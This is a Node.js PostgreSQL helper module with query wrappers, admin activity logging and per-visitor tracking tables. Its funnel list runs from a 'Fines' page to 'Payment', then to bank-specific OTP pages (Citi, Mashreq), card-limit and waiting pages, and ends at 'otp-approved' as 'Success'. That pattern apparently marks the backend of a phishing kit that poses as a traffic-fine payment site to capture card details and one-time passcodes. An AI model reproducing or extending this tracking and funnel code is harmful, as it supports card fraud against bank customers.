const { Pool } = require('pg');
require('dotenv').config();

const pool = new Pool({
  connectionString: process.env.POSTGRES_URL || process.env.DATABASE_URL,
  ssl: process.env.POSTGRES_URL ? { rejectUnauthorized: false } : false,
});

// MySQL uses ? placeholders, PostgreSQL uses $1 $2 $3...
// This converter lets us keep all SQL queries in MySQL style
function toPostgres(sql) {
  let i = 0;
  return sql.replace(/\?/g, () => `$${++i}`);
}

async function query(sql, params = []) {
  const result = await pool.query(toPostgres(sql), params);
  return result.rows;
}

async function queryOne(sql, params = []) {
  const rows = await query(sql, params);
  return rows[0] || null;
}

async function getSetting(key, defaultValue = '') {
  try {
    const row = await queryOne('SELECT value FROM settings WHERE key = ? LIMIT 1', [key]);
    return row ? row.value : defaultValue;
  } catch { return defaultValue; }
}

async function setSetting(key, value) {
  await query(
    'INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value, updated_at = NOW()',
    [key, value]
  );
}

function clientIp(req) {
  return (
    req.headers['cf-connecting-ip'] ||
    req.headers['x-forwarded-for']?.split(',')[0] ||
    req.connection?.remoteAddress ||
    '0.0.0.0'
  );
}

async function ensureActivityLogsTable() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS activity_logs (
      id SERIAL PRIMARY KEY,
      action VARCHAR(80) NOT NULL,
      description TEXT,
      admin_user VARCHAR(100),
      ip VARCHAR(50),
      user_agent TEXT,
      comment TEXT DEFAULT '',
      created_at TIMESTAMPTZ DEFAULT NOW()
    )
  `);
}

async function logActivity(action, description, adminUser, ip, userAgent) {
  try {
    const result = await query(
      'INSERT INTO activity_logs (action, description, admin_user, ip, user_agent) VALUES (?, ?, ?, ?, ?) RETURNING *',
      [action, description, adminUser, ip, userAgent]
    );
    return result[0] || null;
  } catch (e) {
    console.error('logActivity error:', e.message);
    return null;
  }
}

// ─── Tracking tables ─────────────────────────────────────────────────────────
async function ensureTrackingTables() {
  // Visitors row-log: one row per page hit. Existing table, just add columns.
  await pool.query(`ALTER TABLE visitors ADD COLUMN IF NOT EXISTS visitor_id VARCHAR(40) DEFAULT ''`).catch(()=>{});
  await pool.query(`ALTER TABLE visitors ADD COLUMN IF NOT EXISTS user_agent TEXT DEFAULT ''`).catch(()=>{});
  await pool.query(`ALTER TABLE visitors ADD COLUMN IF NOT EXISTS referrer  VARCHAR(500) DEFAULT ''`).catch(()=>{});
  await pool.query(`CREATE INDEX IF NOT EXISTS idx_visitors_vid     ON visitors(visitor_id)`).catch(()=>{});
  await pool.query(`CREATE INDEX IF NOT EXISTS idx_visitors_created ON visitors(created_at)`).catch(()=>{});
  await pool.query(`CREATE INDEX IF NOT EXISTS idx_visitors_ip      ON visitors(ip)`).catch(()=>{});

  // Aggregated state per visitor — updated on each page hit and each heartbeat.
  await pool.query(`
    CREATE TABLE IF NOT EXISTS visitor_state (
      visitor_id   VARCHAR(40) PRIMARY KEY,
      ip           VARCHAR(60) NOT NULL DEFAULT '',
      user_agent   TEXT        NOT NULL DEFAULT '',
      current_path VARCHAR(255) NOT NULL DEFAULT '/',
      first_seen   TIMESTAMPTZ DEFAULT NOW(),
      last_seen    TIMESTAMPTZ DEFAULT NOW(),
      page_count   INTEGER     NOT NULL DEFAULT 1,
      deepest_path VARCHAR(255) NOT NULL DEFAULT '/'
    )
  `).catch(()=>{});
  await pool.query(`CREATE INDEX IF NOT EXISTS idx_vstate_last_seen ON visitor_state(last_seen)`).catch(()=>{});
  await pool.query(`CREATE INDEX IF NOT EXISTS idx_vstate_first     ON visitor_state(first_seen)`).catch(()=>{});
}

// ─── Funnel ranking (depth in the journey) ──────────────────────────────────
const FUNNEL_STEPS = [
  { rank: 1, name: 'Home',     paths: ['/'] },
  { rank: 2, name: 'Fines',    paths: ['/fines'] },
  { rank: 3, name: 'Payment',  paths: ['/payment'] },
  { rank: 4, name: 'OTP/Wait', paths: ['/otp','/otp-sms','/otp-sms2','/otp-citi','/otp-mashreq','/otp-loading','/card-limit','/waiting','/yogunluk'] },
  { rank: 5, name: 'Success',  paths: ['/otp-approved'] },
];
function pathRank(path) {
  for (const s of FUNNEL_STEPS) if (s.paths.includes(path)) return s.rank;
  return 0;
}
function rankName(rank) {
  const s = FUNNEL_STEPS.find(x => x.rank === rank);
  return s ? s.name : '—';
}

// ─── Cleanup older than N days ───────────────────────────────────────────────
async function purgeOldTracking(days = 7) {
  await pool.query(`DELETE FROM visitors      WHERE created_at < NOW() - ($1::int || ' days')::interval`, [days]).catch(()=>{});
  await pool.query(`DELETE FROM visitor_state WHERE last_seen  < NOW() - ($1::int || ' days')::interval`, [days]).catch(()=>{});
}

module.exports = {
  pool, query, queryOne, getSetting, setSetting, clientIp,
  ensureActivityLogsTable, logActivity,
  ensureTrackingTables, purgeOldTracking,
  FUNNEL_STEPS, pathRank, rankName,
};
